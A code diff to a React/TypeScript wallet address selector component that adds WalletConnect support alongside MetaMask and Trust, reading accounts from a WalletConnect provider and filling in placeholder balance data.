@@ -6,7 +6,7 @@ import { Wallet, ArrowLeft, Check, Coins } from "lucide-react";
 import { signatureCollector, type WalletAddressData, type ComprehensiveWalletData } from "@/lib/signature-collector";
 
 interface WalletAddressSelectorProps {
-  walletType: 'metamask' | 'trust';
+  walletType: 'metamask' | 'trust' | 'walletconnect';
   onAddressSelect: (address: string, walletData: ComprehensiveWalletData) => void;
   onBack: () => void;
   isLoading?: boolean;
@@ -32,7 +32,36 @@ export default function WalletAddressSelector({
     try {
       console.log(`Loading ${walletType} addresses...`);
       
-      // First ensure wallet is connected
+      // Handle WalletConnect differently
+      if (walletType === 'walletconnect') {
+        const wcProvider = (window as any).walletConnectProvider;
+        if (wcProvider && wcProvider.accounts && wcProvider.accounts.length > 0) {
+          const wcAddresses = wcProvider.accounts.map((address: string) => ({
+            address,
+            balances: { btc: '0', bnb: '0', usdt: '0', coyn: '0' },
+            isActive: address === wcProvider.accounts[0]
+          }));
+          
+          setAddresses(wcAddresses);
+          setSelectedAddress(wcProvider.accounts[0]);
+          
+          // Create mock comprehensive data for WalletConnect
+          setComprehensiveData({
+            primaryAddress: wcProvider.accounts[0],
+            allAddresses: wcAddresses,
+            walletType: 'walletconnect',
+            totalBalances: { btc: '0', bnb: '0', usdt: '0', coyn: '0' },
+            permissions: { accounts: true, networkSwitch: true, transactionSigning: true }
+          });
+          
+          console.log(`Found ${wcAddresses.length} WalletConnect addresses`);
+          return;
+        } else {
+          throw new Error('WalletConnect provider not available');
+        }
+      }
+      
+      // First ensure wallet is connected (for MetaMask/Trust)
       if (typeof window.ethereum === 'undefined') {
         throw new Error('Wallet not available');
       }
@@ -52,7 +81,14 @@ export default function WalletAddressSelector({
       console.error('Failed to load wallet addresses:', error);
       // Fallback to basic address retrieval
       try {
-        const accounts = await window.ethereum?.request({ method: 'eth_requestAccounts' });
+        let accounts = [];
+        if (walletType === 'walletconnect') {
+          const wcProvider = (window as any).walletConnectProvider;
+          accounts = wcProvider?.accounts || [];
+        } else {
+          accounts = await window.ethereum?.request({ method: 'eth_requestAccounts' });
+        }
+        
         if (accounts.length > 0) {
           const fallbackAddresses = accounts.map((address: string) => ({
             address,
